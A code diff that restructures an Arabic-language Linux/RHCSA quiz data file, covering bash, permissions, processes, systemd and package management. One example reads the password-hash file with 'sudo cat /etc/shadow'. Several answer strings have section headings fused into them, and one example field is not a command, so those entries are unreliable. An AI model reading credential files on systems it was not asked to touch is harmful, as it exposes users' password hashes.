-                a: `<strong>حالة انتهاء العمليات (Exit Status / Codes):</strong><br>هو رمز رقمي ترجعه العملية لنواة النظام فور انتهائها لبيان حالتها، ويتم الاحتفاظ به في المتغير الخاص <code>$?</code>:<br><ul><li><code>0</code> (Success): يعني أن الأمر نُفذ بنجاح تام وبدون أي أخطاء.</li><li><code>أي رقم من 1 إلى 255</code> (Failure): يعني حدوث خطأ أو توقف غير طبيعي. مثال: الكود <code>127</code> يعني أن الأمر غير موجود (Command not found)، والكود <code>1</code> يعني خطأ عام غير محدد.</li></ul>`
+                a: `المتغير $? يحمل كود الخروج. 0 = نجاح، أي قيمة أخرى = فشل.`,
+                example: `ping -c 1 8.8.8.8 && echo $?`,
+                mistakes: `افتراض أن أي قيمة غير الصفر تعني النجاح؛ في لينكس الصفر هو النجاح الوحيد.`,
+                lab: `شغّل <code>ls /random_folder</code> ثم <code>echo $?</code> لمشاهدة كود الفشل (عادة 2).`,
+                ref: `Bash Exit Status Documentation`,
+                related: ['if', 'test']
             },
             {
                 id: 10,
                 cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Advanced",
+                tags: ['Bash'],
+                usedIn: ['RHCSA'],
                 q: `كيف تستخدم حلقة for لتطبيق إعدادات على عدة خوادم؟`,
-                a: `<strong>أتمتة المهام البرمجية والتكرار عبر الشبكة:</strong><br>يمكن كتابتها في سطر واحد لتكرار أمر معين على خوادم متعددة باستخدام SSH:<br><code>for HOST in servera serverb serverc; do ssh $HOST 'sudo systemctl restart httpd'; done</code><br><strong>شرح الآلية:</strong><br>تقوم الحلقة بتعيين قيمة المتغير <code>HOST</code> لكل خادم بالترتيب، ثم تتصل بالخادم وتنفذ أمر إعادة تشغيل خادم الويب Apache (httpd) ثم تنتقل للخادم التالي تلقائياً.`
+                a: `for HOST in servera serverb serverc; do ssh $HOST 'sudo systemctl restart httpd'; done`,
+                example: `for h in srv1 srv2; do ssh $h 'uptime'; done`,
+                mistakes: `نسيان الفاصلة المنقوطة <code>;</code> قبل كلمة <code>do</code> و <code>done</code> عند كتابة الحلقة في سطر واحد.`,
+                lab: `جرب تشغيل حلقة بسيطة محلياً: <code>for name in abdo user admin; do echo "Hello $name"; done</code>.`,
+                ref: `Bash Loop Constructs Manual`,
+                related: ['while', 'ssh']
             },
             {
                 id: 11,
                 cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Advanced",
+                tags: ['Bash'],
+                usedIn: ['RHCSA'],
                 q: `ما هي Regex وما الفرق بين Basic و Extended؟`,
-                a: `<strong>التعبيرات النمطية للبحث المتقدم في النصوص (Regular Expressions):</strong><br>هي أنماط محددة لمطابقة السلاسل النصية وتصفيتها بمرونة عالية:<br><ul><li><strong>Basic Regex (BRE):</strong> التنسيق الافتراضي للأداة <code>grep</code>. يتطلب وضع مائلة عكسية <code>\</code> قبل الرموز المتقدمة مثل <code>( )</code> أو <code>{ }</code> أو <code>|</code> لتفعيل خاصيتها النمطية.</li><li><strong>Extended Regex (ERE):</strong> التنسيق الموسع الذي يتم تفعيله بالخيار <code>grep -E</code> أو <code>egrep</code>. يدعم كافة الرموز المتقدمة مباشرة دون الحاجة لهروبها بـ <code>\</code>.</li></ul>`
+                a: `Regular Expressions — أنماط للبحث في النصوص. grep = Basic. grep -E أو egrep = Extended (يدعم |, +, ?, {}).`,
+                example: `grep -E "root|bin" /etc/passwd`,
+                mistakes: `استخدام الرموز مثل <code>|</code> في grep العادي دون هروب وتوقع عملها كعلاقة 'أو'.`,
+                lab: `ابحث في ملفpasswd عن السطور التي تحتوي root أو bin باستخدام كلا التنسيقين.`,
+                ref: `man grep`,
+                related: ['sed', 'awk']
             },
             {
                 id: 12,
                 cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Intermediate",
+                tags: ['Bash'],
+                usedIn: ['RHCSA'],
                 q: `ما معنى ^ و $ في Regex؟`,
-                a: `<strong>محددات المواقع النصية (Regex Anchors):</strong><br><ul><li><code>^</code> (Caret): يطابق <strong>بداية السطر</strong> فقط. مثال: <code>grep '^root' /etc/passwd</code> يبحث عن الأسطر التي تبدأ تماماً بكلمة root.</li><li><code>$</code> (Dollar Sign): يطابق <strong>نهاية السطر</strong> فقط. مثال: <code>grep 'bash$' /etc/passwd</code> يبحث عن الأسطر التي تنتهي بكلمة bash (مثل المستخدمين الذين يمتلكون واجهة شل نشطة).</li><li>الرمز المركب <code>^$</code> يطابق الأسطر الفارغة تماماً.</li></ul>`
+                a: `^ = بداية السطر، $ = نهاية السطر.
+3️⃣ الهوية والصلاحيات (DAC)`,
+                example: `grep "^root" /etc/passwd`,
+                mistakes: `كتابة الرمز في مكان خاطئ، مثل <code>root^</code> بدلاً من <code>^root</code>.`,
+                lab: `قم بتصفية ملف passwd لعرض الحسابات التي تستخدم shell من نوع bash فقط.`,
+                ref: `Regex Anchors Reference Guide`,
+                related: ['grep', 'sed']
             },
             {
                 id: 13,
                 cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Beginner",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
                 q: `أين تُحفظ بيانات المستخدمين المحليين وكلمات المرور؟`,
-                a: `<strong>الملفات التأسيسية لإدارة الهويات وصلاحيات الدخول:</strong><br><ul><li>ملف <code>/etc/passwd</code>: يحتوي على بيانات الحساب الأساسية مثل (اسم المستخدم، معرف المستخدم UID، المعرف الجروبي GID، المسار المنزلي، الشل الافتراضي) وهو متاح للقراءة من الجميع.</li><li>ملف <code>/etc/shadow</code>: يحتوي على كلمات المرور بعد تشفيرها (Password Hashes) وتواريخ صلاحيتها ومواعيد تغييرها. لأسباب أمنية بالغة، لا يمكن قراءته إلا بصلاحيات الـ <code>root</code>.</li></ul>`
+                a: `/etc/passwd — بيانات المستخدمين. /etc/shadow — كلمات المرور المشفرة (للقراءة فقط من root).`,
+                example: `cat /etc/passwd\nsudo cat /etc/shadow`,
+                mistakes: `تغيير صلاحيات shadow لتكون مقروءة للجميع، مما يسهل استخراج كلمات المرور المشفرة وتخمينها.`,
+                lab: `افحص الصلاحيات الافتراضية للملفين بـ <code>ls -l</code>.`,
+                ref: `man passwd / man shadow`,
+                related: ['useradd', 'chown']
             },
             {
                 id: 14,
                 cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Beginner",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
                 q: `ما هي سياسة User Private Groups في RHEL؟`,
-                a: `<strong>سياسة المجموعة الخاصة بالمستخدم (UPG Policy):</strong><br>هي السياسة الافتراضية في توزيعات Red Hat؛ حيث عند إنشاء مستخدم جديد (مثلاً: <code>useradd abdo</code>)، يقوم النظام تلقائياً بإنشاء مجموعة فريدة تحمل نفس الاسم <code>abdo</code> ويكون المستخدم هو العضو الوحيد والافتراضي فيها. هذا يمنع المستخدمين الآخرين من الوصول لملفات المستخدم الجديد بشكل افتراضي ويوفر خصوصية وأماناً متقدماً.`
+                a: `عند إنشاء مستخدم، يُنشأ مجموعة بنفس اسم المستخدم لتسهيل إدارة الصلاحيات المشتركة.`,
+                example: `useradd adminuser`,
+                mistakes: `الاعتقاد بأن مجموعات المستخدم تُنشأ يدوياً دائماً؛ النظام يسهل ذلك بسياسة UPG.`,
+                lab: `أنشئ مستخدماً واحداً ولاحظ مجموعته الخاصة بـ <code>id</code>.`,
+                ref: `RHEL User Management Guide`,
+                related: ['groupadd', 'id']
             },
             {
                 id: 15,
                 cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Intermediate",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
                 q: `ما هي أدوات إدارة المستخدمين؟`,
-                a: `<strong>الأوامر الأساسية لإدارة الحسابات والمجموعات المحلية:</strong><br><ul><li><code>useradd</code>: إنشاء حساب مستخدم محلي جديد.</li><li><code>usermod</code>: تعديل خصائص مستخدم قائم (مثل إضافة مستخدم لمجموعة الـ sudoers: <code>usermod -aG wheel username</code>).</li><li><code>userdel</code>: حذف مستخدم (الخيار <code>-r</code> يحذف مجلده المنزلي أيضاً).</li><li><code>groupadd</code>: إنشاء مجموعة جديدة.</li><li><code>groupmod</code>: تعديل خصائص مجموعة (مثل الـ GID أو الاسم).</li><li><code>groupdel</code>: حذف مجموعة.</li></ul>`
+                a: `useradd, usermod, userdel, groupadd, groupmod, groupdel.`,
+                example: `usermod -aG wheel user1`,
+                mistakes: `نسيان خيار <code>-a</code> (Append) مما يتسبب في إزالة المستخدم من جميع المجموعات الأخرى فوراً.`,
+                lab: `أضف مستخدماً لمجموعة wheel وتحقق بـ <code>groups user1</code>.`,
+                ref: `man usermod`,
+                related: ['useradd', 'userdel']
             },
             {
                 id: 16,
                 cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Beginner",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
                 q: `ما هي مستويات الأذونات الثلاثة؟`,
-                a: `<strong>أذونات التحكم بالوصول الاختياري (DAC Permissions Structure):</strong><br>يتم تقسيم الصلاحيات في نظام الملفات إلى ثلاثة مستويات رئيسية:<br><ul><li><strong>u (User/Owner):</strong> صلاحيات المستخدم المالك للملف.</li><li><strong>g (Group):</strong> صلاحيات أعضاء المجموعة المالكة للملف.</li><li><strong>o (Others):</strong> صلاحيات أي مستخدم آخر في النظام.</li></ul>ولكل مستوى ثلاثة أنواع من الصلاحيات: القراءة (r=4)، الكتابة (w=2)، والتنفيذ (x=1).`
+                a: `User (u), Group (g), Others (o). ولكل منها: Read (r=4), Write (w=2), Execute (x=1).`,
+                example: `chmod u+rwx,g+rx,o-rwx file`,
+                mistakes: `إعطاء المستخدم إذن القراءة فقط للمجلد وتوقع قدرته على فتحه؛ المجلدات تحتاج x للدخول.`,
+                lab: `أنشئ مجلداً وعين له صلاحية r فقط للمجموعات، وجرب عمل <code>cd</code> داخله.`,
+                ref: `man chmod`,
+                related: ['chown', 'umask']
             },
             {
                 id: 17,
                 cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Beginner",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
                 q: `كيف تحسب الأذونات الرقمية 755؟`,
-                a: `<strong>حساب الصلاحيات بالنظام الثماني (Octal Notation):</strong><br>نقوم بجمع أرقام الصلاحيات المطلوبة لكل مستوى على حدة (القراءة=4، الكتابة=2، التنفيذ=1):<br><ul><li>الرقم الأول <code>7</code> (للمالك): 4+2+1 = <code>rwx</code> (كامل الصلاحيات).</li><li>الرقم الثاني <code>5</code> (للمجموعة): 4+0+1 = <code>r-x</code> (قراءة وتشغيل فقط).</li><li>الرقم الثالث <code>5</code> (للآخرين): 4+0+1 = <code>r-x</code> (قراءة وتشغيل فقط).</li></ul>تستخدم عادةً للمجلدات والسكربتات لتعمل دون تمكين الآخرين من تعديلها.`
+                a: `7 = rwx (4+2+1) للمالك، 5 = r-x (4+0+1) للمجموعة، 5 = r-x للآخرين.`,
+                example: `chmod 755 run.sh`,
+                mistakes: `إعطاء الصلاحية الكاملة 777 لأي سكريبت مخصص، مما يعرض خادمك لثغرات حقن الكود.`,
+                lab: `حول ملف نصي لملف تشغيل بـ 755 وجرب تشغيله.`,
+                ref: `POSIX Permissions Guide`,
+                related: ['chmod', 'ls']
             },
             {
                 id: 18,
                 cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Advanced",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
                 q: `ما هو SetGID على مجلد وما فائدته؟`,
-                a: `<strong>بت الهوية المشتركة للمجموعات (Set Group ID):</strong><br>هي صلاحية خاصة يتم تفعيلها على المجلدات باستخدام الأمر: <code>chmod g+s /dir</code>.<br><strong>الفائدة:</strong> عند تفعيلها، يرث أي ملف أو مجلد جديد يتم إنشاؤه داخل هذا المجلد مجموعة المجلد الأب تلقائياً، بدلاً من المجموعة الافتراضية للمستخدم الذي قام بالإنشاء. وهي ضرورية جداً لإعداد المجلدات المشتركة لفرق العمل.`
+                a: `chmod g+s /shared — أي ملف يُنشأ داخل المجلد يرث ملكية مجموعة المجلد الأصلي.`,
+                example: `chmod g+s /shared`,
+                mistakes: `تفعيل SetGID دون تغيير مجموعة المجلد الرئيسية لـ group الفريق المطلوب.`,
+                lab: `أنشئ مجلداً مشتركاً للفريق وعين SetGID وتأكد من وراثة المجموعة للملفات الجديدة.`,
+                ref: `man chmod (Special Permissions)`,
+                related: ['chown', 'umask']
             },
             {
                 id: 19,
                 cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Intermediate",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
                 q: `ما الفرق بين chmod و chown؟`,
-                a: `<strong>الفرق الوظيفي بين تعديل الملكية وتعديل الأذونات:</strong><br><ul><li><code>chmod</code> (Change Mode): يختص بتغيير وتعديل أذونات وصلاحيات الوصول للملف أو المجلد (مثل القراءة، الكتابة، التشغيل) للمالك أو المجموعة أو الآخرين.</li><li><code>chown</code> (Change Owner): يختص بنقل وتعديل ملكية الملف أو المجلد لمستخدم آخر و/أو مجموعة أخرى (مثل: <code>chown user:group file.txt</code>).</li></ul>`
+                a: `chmod — تغيير الأذونات. chown — تغيير المالك والمجموعة.
+4️⃣ العمليات والخدمات`,
+                example: `chown abdo:team file.txt`,
+                mistakes: `استخدام الفاصلة العادية بدلاً من النقطتين <code>:</code> لفصل اسم المالك والمجموعة.`,
+                lab: `قم بنقل ملكية ملف لمستخدم آخر ومجموعة مختلفة وتحقق بالتفاصيل.`,
+                ref: `man chown`,
+                related: ['chgrp', 'chmod']
             },
             {
                 id: 20,
                 cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما هو PID وكيف تراقب العمليات؟`,
-                a: `<strong>هوية العمليات ومراقبتها (Process ID):</strong><br>الـ PID هو رقم تعريفي فريد تسنده النواة لكل عملية نشطة في النظام فور تشغيلها. تتم مراقبة العمليات باستخدام الأدوات التالية:<br><ul><li><code>ps</code>: يعرض لقطة إحصائية ثابتة ولحظية للعمليات (مثل <code>ps aux</code>).</li><li><code>top</code> / <code>htop</code>: أداة تفاعلية حية لتتبع استهلاك المعالج والرام والعمليات بالوقت الفعلي.</li><li><code>pgrep [name]</code>: يبحث عن الـ PID الخاص بعملية معينة باستخدام اسمها مباشرة.</li></ul>`
+                a: `Process ID — معرف فريد لكل عملية. ps (لقطة)، top/htop (تفاعلي)، pgrep (البحث).`,
+                example: `ps aux | grep nginx\npgrep nginx`,
+                mistakes: `الاعتقاد بأن ps يعرض الحالة المستمرة؛ ps يعرض لقطة ثابتة فقط للذاكرة الحالية.`,
+                lab: `افتح <code>htop</code> وراقب استهلاك المعالج للعمليات النشطة بشكل حي تفاعلي.`,
+                ref: `man ps`,
+                related: ['top', 'htop', 'kill']
             },
             {
                 id: 21,
                 cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Expert",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما هي خوارزمية CFS في Linux؟`,
-                a: `<strong>مجدول المهام العادل تماماً (Completely Fair Scheduler):</strong><br>هي خوارزمية جدولة المهام الافتراضية في كيرنل لينكس لإدارة وتوزيع وقت المعالج على العمليات. تعتمد على فكرة توزيع قوة المعالجة بعدالة تامة باستخدام بنية بيانات شجرة البحث الثنائية المتوازنة (Red-Black Tree)؛ لضمان أن كل عملية تحصل على حصتها العادلة وتجنب حرمان أي عملية من المعالجة.`
+                a: `Completely Fair Scheduler — خوارزمية جدولة عادلة باستخدام شجرة بحث ثنائية (Red-Black Tree).`,
+                example: `CFS scheduler details`,
+                mistakes: `الاعتقاد بأن CFS يعتمد على الجدولة الزمنية البسيطة (Round Robin)؛ هو نظام متطور يعتمد على شجرة بحث حمراء-سوداء.`,
+                lab: `افحص ملفات نظام الجدولة عبر <code>cat /proc/sys/kernel/sched_latency_ns</code>.`,
+                ref: `Linux Kernel CFS Documentation`,
+                related: ['nice', 'chrt']
             },
             {
                 id: 22,
                 cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما هو Nice Value وما هو نطاقه؟`,
-                a: `<strong>مؤشر أولوية جدولة العمليات (Nice Value):</strong><br>هو مؤشر رقمي يحدد أولوية وصول العملية لوحدة المعالجة المركزية (CPU) بالنسبة للعمليات الأخرى:<br><ul><li><strong>النطاق:</strong> يتراوح من <code>-20</code> (أعلى أولوية وأكثر استئثاراً بالمعالج) إلى <code>19</code> (أقل أولوية وإيثاراً للغير).</li><li><strong>الافتراضي:</strong> <code>0</code> لجميع العمليات العادية.</li><li>ملاحظة: المستخدم العادي يمكنه خفض أولوية عملياته فقط (إلى قيم موجبة)، بينما الـ <code>root</code> يمكنه رفع الأولوية (إلى قيم سالبة).</li></ul>`
+                a: `يحدد أولوية العملية. النطاق: -20 (أعلى أولوية) إلى 19 (أقل أولوية). الافتراضي: 0.`,
+                example: `nice -n 10 my_script.sh`,
+                mistakes: `محاولة المستخدم العادي خفض قيمة nice إلى قيم سالبة؛ النواة تمنع ذلك وتسمح فقط للـ root بتسريع العمليات.`,
+                lab: `شغّل عملية بقيمة nice موجبة كمستخدم عادي وتأكد بـ <code>ps -l</code>.`,
+                ref: `man nice`,
+                related: ['renice', 'top']
             },
             {
                 id: 23,
                 cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما الفرق بين nice و renice؟`,
-                a: `<strong>التحكم في أولوية العمليات في مراحل مختلفة:</strong><br><ul><li><code>nice</code>: يُستخدم لتحديد أولوية مخصصة لعملية أو برنامج جديد <strong>قبل أو عند بدء تشغيله</strong>. مثال: <code>nice -n 10 backup.sh</code>.</li><li><code>renice</code>: يُسخدم لتعديل وتغيير أولوية عملية <strong>قيد التشغيل والعمل بالفعل</strong> في النظام باستخدام معرفها الرقمي PID. مثال: <code>renice -n 5 -p 1234</code>.</li></ul>`
+                a: `nice — بدء عملية بأولوية محددة. renice — تغيير أولوية عملية قيد التشغيل.`,
+                example: `renice -n 5 -p 1234`,
+                mistakes: `استخدام nice بدلاً من renice لتعديل أولوية عملية تعمل بالفعل.`,
+                lab: `شغّل عملية بالخلفية، واحصل على الـ PID الخاص بها وقم بتغيير أولويتها بـ <code>renice</code>.`,
+                ref: `man renice`,
+                related: ['nice', 'kill']
             },
             {
                 id: 24,
                 cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما الفرق بين SIGTERM و SIGKILL؟`,
-                a: `<strong>إشارات إنهاء العمليات (Process Termination Signals):</strong><br><ul><li><code>SIGTERM (15)</code> (Terminate): إشارة الإنهاء الافتراضية والودية. تطلب من العملية الإغلاق وتسمح لها بحفظ حالتها الحالية وتنظيف الذاكرة وإغلاق ملفاتها المفتوحة بأمان قبل التوقف.</li><li><code>SIGKILL (9)</code> (Kill): إشارة إنهاء فورية وقسرية. تقوم النواة بقتل وإنهاء العملية فوراً ودون منحها أي فرصة لتنظيف الذاكرة أو حفظ ملفاتها، وتستخدم في حال تجمدت العملية تماماً.`
+                a: `SIGTERM (15) — إنهاء سلمي يسمح بتنظيف الموارد. SIGKILL (9) — إنهاء قسري فوري.`,
+                example: `kill -15 PID\nkill -9 PID`,
+                mistakes: `استخدام <code>kill -9</code> كخيار أول دائماً؛ هذا يمنع العملية من حفظ حالتها وقد يتسبب في تلف قواعد البيانات.`,
+                lab: `شغّل عملية تجريبية، وجرب إنهاءها بـ SIGTERM أولاً، ثم قسرياً بـ SIGKILL.`,
+                ref: `man kill (إشارات النظام)`,
+                related: ['pkill', 'killall']
             },
             {
                 id: 25,
                 cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما هو systemd وما يحل محله؟`,
-                a: `<strong>نظام إدارة ومراقبة خادم Linux الأساسي:</strong><br>هو نظام تهيئة وإدارة الخدمات المعاصر (PID 1) والمسؤول عن إقلاع النظام وإدارة الوحدات (Units) والخدمات. يحل محل نظام التهيئة القديم <strong>SysVinit</strong>. يتميز بـ:<br><ul><li>تشغيل الخدمات بشكل متوازٍ لتسريع عملية الإقلاع.</li><li>مراقبة العمليات باستخدام ميزة مجموعات التحكم (cgroups) بدقة.</li><li>إدارة التبعيات بين الخدمات تلقائياً.</li></ul>`
+                a: `مدير النظام والخدمات. يحل محل SysVinit. يدير الخدمات عبر Unit Files.`,
+                example: `systemctl list-units --type=service`,
+                mistakes: `الخلط بين نظام systemd وأنظمة SysVinit القديمة التي كانت تعتمد على سكريبتات تسلسلية بطيئة.`,
+                lab: `ابحث عن وحدات الخدمات النشطة بالنظام باستخدام <code>systemctl</code>.`,
+                ref: `man systemd`,
+                related: ['systemctl', 'journalctl']
             },
             {
                 id: 26,
                 cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما هي أوامر systemctl الأساسية؟`,
-                a: `<strong>إدارة حالة الخدمات والنظام (Systemctl Commands):</strong><br><ul><li><code>start</code> / <code>stop</code>: لتشغيل أو إيقاف الخدمة في الوقت الحالي.</li><li><code>restart</code>: لإعادة التشغيل بالكامل.</li><li><code>reload</code>: لتحديث وقراءة ملف الإعدادات دون إيقاف تشغيل الخدمة (Hot reload).</li><li><code>enable</code> / <code>disable</code>: لتشغيل الخدمة تلقائياً مع إقلاع السيرفر أو إلغائه.</li><li><code>status</code>: لعرض حالة الخدمة التفصيلية وآخر سطور السجل الخاص بها.</li></ul>`
+                a: `start, stop, restart, reload, enable, disable, status, is-active, is-enabled.`,
+                example: `sudo systemctl enable --now httpd`,
+                mistakes: `تشغيل <code>enable</code> والاعتقاد أن الخدمة بدأت فوراً؛ <code>enable</code> يربطها بالإقلاع فقط ويجب استخدام <code>--now</code> لتشغيلها بالحال.`,
+                lab: `قم بتمكين وتشغيل خدمة جدار الحماية بأمر واحد وتأكد من حالتها.`,
+                ref: `man systemctl`,
+                related: ['service', 'chkconfig']
             },
             {
                 id: 27,
                 cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Advanced",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما هي ملفات تعريف Tuned المتاحة؟`,
-                a: `<strong>ضبط أداء النظام بشكل ديناميكي (Tuned Profiles):</strong><br>خدمة Tuned توفر ملفات تعريفية جاهزة لتحسين استجابة النظام بناءً على دوره التشغيلي:<br><ul><li><code>throughput-performance</code>: لتحسين الأداء العام ورفع سرعة المعالجة ونقل البيانات (سيرفرات عادية).</li><li><code>latency-performance</code>: لتقليل زمن الاستجابة والـ delay على حساب زيادة طفيفة في استهلاك الطاقة (سيرفرات قواعد البيانات).</li><li><code>virtual-guest</code>: لتحسين أداء الأنظمة التي تعمل كأجهزة افتراضية (Virtual Machines).</li><li><code>powersave</code>: لخفض استهلاك الطاقة لأقصى حد.</li></ul>`
+                a: `throughput-performance, latency-performance, virtual-guest, powersave, balanced.`,
+                example: `tuned-adm profile virtual-guest`,
+                mistakes: `تعديل إعدادات النواة يدوياً وبشكل عشوائي بدلاً من استخدام ملفات Tuned الجاهزة والآمنة.`,
+                lab: `اعرض الملفات المتاحة بـ <code>tuned-adm list</code> وقم بتهيئة الملف الموصى به لربط أداء السيرفر.`,
+                ref: `man tuned`,
+                related: ['tuned-adm', 'sysctl']
             },
             {
                 id: 28,
                 cat: "4️⃣ العمليات والخدمات",
+                difficulty: "Intermediate",
+                tags: ['Systemd', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `ما هي الإشارات (Signals) وكيف ترسلها؟`,
-                a: `<strong>إشارات التحكم وإدارة العمليات (Process Signaling):</strong><br>الرسائل هي وسيلة تواصل ترسلها النواة أو المستخدم للتحكم بحالة العملية. يتم إرسالها بأمر <code>kill</code>:<br><ul><li><code>kill -15 PID</code> (أو <code>kill -SIGTERM PID</code>): إشارة الإيقاف المنظم (الافتراضية).</li><li><code>kill -9 PID</code> (أو <code>kill -SIGKILL PID</code>): إشارة القتل الفوري للعمليات المجمدة.</li><li><code>kill -1 PID</code> (أو <code>kill -SIGHUP PID</code>): إشارة إعادة قراءة ملفات التكوين.</li></ul>`
+                a: `kill -SIGTERM PID أو kill -15 PID. kill -9 PID للإنهاء القسري.
+5️⃣ البرمجيات والمستودعات`,
+                example: `kill -1 PID # SIGHUP`,
+                mistakes: `إرسال إشارة خاطئة تتسبب في إيقاف الخدمة بدلاً من إعادة قراءة الإعدادات.`,
+                lab: `أرسل إشارة SIGHUP لخادم الويب للتأكد من قراءة التكوين الجديد دون إيقاف الاتصالات الحالية.`,
+                ref: `man kill (Signals list)`,
+                related: ['kill', 'pkill']
             },
             {
                 id: 29,
                 cat: "5️⃣ البرمجيات والمستودعات",
+                difficulty: "Intermediate",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
                 q: `ما هو DNF وما يحل محله؟`,
-                a: `<strong>مدير حزم البرامج المعاصر في Red Hat:</strong><br>الـ DNF (Dandified YUM) هو أداة إدارة حزم البرامج وتحديثها وتنزيلها وحل تبعياتها تلقائياً. يحل محل أداة <code>yum</code> القديمة بالكامل. يتميز بـ:<br><ul><li>محرك أسرع لحل مشكلات تعارض التبعيات البرمجية.</li><li>استهلاك أقل للذاكرة العشوائية وسرعة استعلام عالية.</li><li>التوافق الكامل مع نفس معاملات وأوامر yum السابقة لتسهيل الانتقال.</li></ul>`
+                a: `Dandified YUM — مدير الحزم الحديث. يحل محل yum القديم.`,
+                example: `dnf install httpd`,
+                mistakes: `استخدام أدوات إدارة قديمة أو نسيان تحديث المستودعات قبل البحث عن حزمة.`,
+                lab: `ابحث عن حزمة معينة وقم بتثبيتها وتحديثها بـ <code>dnf</code>.`,
+                ref: `man dnf`,
+                related: ['rpm', 'yum']
             },
             {
                 id: 30,
                 cat: "5️⃣ البرمجيات والمستودعات",
+                difficulty: "Intermediate",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
                 q: `ما الفرق بين BaseOS و AppStream؟`,
-                a: `<strong>تقسيم مستودعات حزم RHEL 9 (Repositories Architecture):</strong><br>تم تقسيم المستودعات إلى قسمين لتوفير استقرار مثالي للمؤسسات:<br><ul><li><strong>BaseOS:</strong> يحتوي على حزم ومكونات نظام التشغيل الجوهرية والأساسية (مثل الكيرنل وأدوات النظام القياسية) التي تمتاز بدورة حياة طويلة ومستقرة جداً ولا تتطلب تحديثات متكررة.</li><li><strong>AppStream:</strong> يحتوي على حزم البرمجيات الخارجية والتطبيقات وقواعد البيانات ولغات البرمجة (مثل Python, MariaDB) التي تدعم إصدارات متعددة يمكن تحديثها بشكل مستقل (Application Streams).</li></ul>`
+                a: `BaseOS — حزم أساسية بدورة حياة طويلة. AppStream — إصدارات متعددة من التطبيقات واللغات البرمجية.`,
+                example: `dnf module list python`,
+                mistakes: `تثبيت حزم عشوائية من الويب بدلاً من الاعتماد على مستودعات AppStream المعزولة والآمنة.`,
+                lab: `تصفح وحدات AppStream البرمجية المتاحة بالنظام وقارن إصداراتها.`,
+                ref: `RHEL Application Streams Guide`,
+                related: ['dnf module', 'repoquery']
             },
             {
                 id: 31,
                 cat: "5️⃣ البرمجيات والمستودعات",
+                difficulty: "Intermediate",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
                 q: `ما هي Flatpak وما ميزتها؟`,
-                a: `<strong>نظام إدارة التطبيقات المعزولة (Sandboxed Applications):</strong><br>هي تقنية حديثة لتعبئة وتوزيع تطبيقات واجهة المستخدم الرسومية بشكل مستقل. وميزاتها الأساسية:<br><ul><li><strong>العزل الكامل (Sandbox):</strong> يعمل التطبيق في بيئة معزولة تماماً لا تؤثر على ملفات أو إعدادات نظام التشغيل المستضيف.</li><li><strong>دمج التبعيات:</strong> تأتي كل حزمة Flatpak محملة بكافة المكتبات والتبعيات التي تحتاجها للتشغيل، مما يمنع تعارض الحزم بالنظام.</li></ul>`
+                a: `تقنية لتثبيت تطبيقات معزولة (Sandboxed) مع تبعياتها الخاصة، لا تتداخل مع حزم النظام.`,
+                example: `flatpak list`,
+                mistakes: `محاولة تشغيل حزم flatpak بصلاحيات root كاملة؛ هي مصممة أساساً للعزل التام للمستخدم العادي.`,
+                lab: `ابحث عن تطبيق معزول داخل مستودع flatpak وتأكد من عزله.`,
+                ref: `Flatpak Documentation`,
+                related: ['snap', 'docker']
             },
             {
                 id: 32,
                 cat: "5️⃣ البرمجيات والمستودعات",
+                difficulty: "Intermediate",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
                 q: `كيف تثبت تطبيق Flatpak؟`,
-                a: `<strong>خطوات تهيئة وتثبيت حزم Flatpak:</strong><br><ol><li>أضف مستودع flathub الرسمي المعتمد للنظام:<br><code>flatpak remote-add --if-not-exists flathub https://dl.flathub.org/repo/flathub.flatpakrepo</code></li><li>قم بالبحث وتثبيت التطبيق المطلوب باستخدام معرفه الفريد (مثال تثبيت برنامج GIMP للتصميم):<br><code>flatpak install flathub org.gimp.GIMP</code></li><li>لتشغيل التطبيق المثبت:<br><code>flatpak run org.gimp.GIMP</code></li></ol>`
+                a: `flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo ثم flatpak install flathub app.name
+6️⃣ الشبكات`,
+                example: `flatpak install flathub org.gimp.GIMP`,
+                mistakes: `نسيان إضافة مستودع flathub أولاً مما يؤدي إلى فشل التثبيت.`,
+                lab: `أضف مستودع flathub وثبت تطبيقاً معزولاً للتحقق من سلامة الأداة.`,
+                ref: `flatpak install manual`,
+                related: ['flatpak run', 'flatpak update']
             },
             {
                 id: 33,
